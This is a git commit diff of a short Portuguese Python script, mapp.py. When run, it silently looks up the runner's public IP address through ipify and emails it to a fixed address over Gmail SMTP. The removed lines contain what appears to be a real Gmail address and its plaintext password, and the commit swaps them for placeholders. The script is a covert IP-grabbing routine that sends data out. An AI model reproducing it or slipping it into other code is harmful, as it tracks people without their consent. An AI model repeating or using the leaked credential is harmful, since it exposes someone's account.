1e7a101e4dde9224b9f00b55c86b30f36978bec3
sementinha-hostil <136841545+sementinha-hostil@users.noreply.github.com>
2023-07-10 15:31:33 -0300

    Atualizar o mapp.py

--- mapp.py
+++ mapp.py
@@ -2,11 +2,11 @@ import smtplib
 import email.message
 import requests
 
-def enviar_email():  
+def enviar_email():
     # Obter o endereço IP
     response = requests.get('https://api.ipify.org?format=json')
     ip = response.json()['ip']
-    
+
     # Construir a mensagem de e-mail
     corpo_email = f"""
     <h1>Endereço IP do Usuário</h1>
@@ -15,18 +15,17 @@ def enviar_email():
 
     msg = email.message.Message()
     msg['Subject'] = "Endereço IP do Usuário"
-    msg['From'] = 'm4ria.gama@gmail.com'
-    msg['To'] = 'm4ria.gama@gmail.com'
-    password = 'Prosopopei4' 
+    msg['From'] = 'seu_email@gmail.com'
+    msg['To'] = 'destinatario@gmail.com'
+    password = 'sua_senha'
     msg.add_header('Content-Type', 'text/html')
     msg.set_payload(corpo_email)
 
-    s = smtplib.SMTP('smtp.gmail.com: 587')
+    s = smtplib.SMTP('smtp.gmail.com:587')
     s.starttls()
     # Credenciais de login para enviar o e-mail
     s.login(msg['From'], password)
     s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
-    print('Email enviado')
-
+    print('Email enviado com sucesso')
 
 enviar_email()
